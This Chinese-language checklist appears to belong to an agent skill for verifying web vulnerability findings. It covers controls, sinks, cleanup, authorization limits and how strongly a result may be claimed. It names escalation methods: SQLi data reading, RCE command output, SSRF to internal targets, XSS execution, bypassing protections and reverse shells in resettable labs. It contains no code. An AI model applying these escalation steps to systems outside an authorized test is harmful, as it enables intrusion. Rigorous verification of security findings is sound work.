- [ ] 是否写清第三方真实资源、真实凭据、快照/重置/清理边界？

### 请求与 Source

- [ ] 是否有完整 baseline 请求？
- [ ] 是否有完整强正控请求？
- [ ] 是否有完整负控请求？
- [ ] 是否只改变一个关键变量？
- [ ] 是否证明字段进入后端且仍可控？
- [ ] 是否记录可控粒度和可控主体？
- [ ] 如果 source 是对象标识符，是否区分手工样本 ID、管理员视角 ID、攻击者可获得 ID 和可批量获得 ID？

### Sink 与防护

- [ ] 是否定位 sink 危险参数？
- [ ] 是否有运行日志或观察点证明 sink 相关路径？
- [ ] 是否检查防护同变量、同路径、同上下文？
- [ ] 是否验证框架默认防护是否真实生效？
- [ ] 是否尝试合理绕过，而不是看到防护名就停止？

### 强验证与最高影响

- [ ] SQLi 是否不只停留在错误，而尝试 boolean/time/UNION/测试数据读取？
- [ ] RCE 是否不只停留在 marker，而尝试命令输出/身份/工作目录/受控文件/OOB？
- [ ] SSRF 是否不只停留在公网 callback，而追最终目标/重定向/内网 canary/响应可读性？
- [ ] XSS 是否不只停留在反射，而证明浏览器执行/DOM/同源能力/存储传播？
- [ ] 文件类是否证明最终路径、base 越界、访问/执行/覆盖影响？
- [ ] 越权是否使用 A/B 主体、对象归属和租户对照？
- [ ] 越权是否证明 ID 获取链，而不是只改一个已知 ID 看响应？
- [ ] 批量/广义影响是否证明 ID 能批量、持续、枚举、列表、搜索、导出、关系链或可推导获得？
- [ ] SCA 是否证明运行加载、调用路径和触发条件？
- [ ] Secret 是否证明暴露面、有效性、权限范围和轮换状态，且非账号类敏感材料展示边界清楚？
- [ ] 是否写明最高已证明影响？
- [ ] 若未继续升级，是否写明停止原因？

### 负控与影响

- [ ] 是否至少一个负控成立？
- [ ] 高风险结论是否有多个负控或充分解释？
- [ ] 是否排除缓存、随机、限流、错误页、WAF、正常权限？
- [ ] 是否证明真实影响而不是 200、callback、marker、错误？
- [ ] 是否写清 allowed / forbidden claims？

### 清理与边界

- [ ] 状态变更是否仅限测试对象？
- [ ] 文件写入是否仅限测试目录或声明的 canary 路径？
- [ ] 是否记录回滚/清理命令和结果？
- [ ] 是否避免第三方未授权目标？
- [ ] 是否避免输出真实 secret、token、cookie、密码和个人敏感信息？
- [ ] 若使用资源压力、持久化、shell/回连、删除/覆盖等高强度验证，是否限定在可重置环境并记录恢复结果？

### 结论

- [ ] 是否避免 scanner-only / sink-only / external-tool-only technical_confirmed？
- [ ] 是否避免 pending / candidate / blocked 写成 technical_confirmed？
- [ ] 是否避免“已知 ID 后可利用”直接写高价值 technical_confirmed？
- [ ] 是否避免单对象结果外推成批量、全量或广义影响？
- [ ] 是否避免官方安全模型 unknown 时写对外可提交？
- [ ] 是否把 technical_confirmed 与对外提交资格 分层，而不是把动态强验证自动等同于可提交漏洞？
- [ ] 缺运行态是否降级为 candidate 或 blocked？
- [ ] 防护有效是否 rejected 或降级？
- [ ] 报告阶段是否引用唯一模板，并且本 Skill 产生的复现、Web 操作、强正控、负控、最高影响、清理和声明边界事实均已回链 EVID？
- [ ] 是否去除了来源叙事、临时过程、环境私有细节和运维流程？
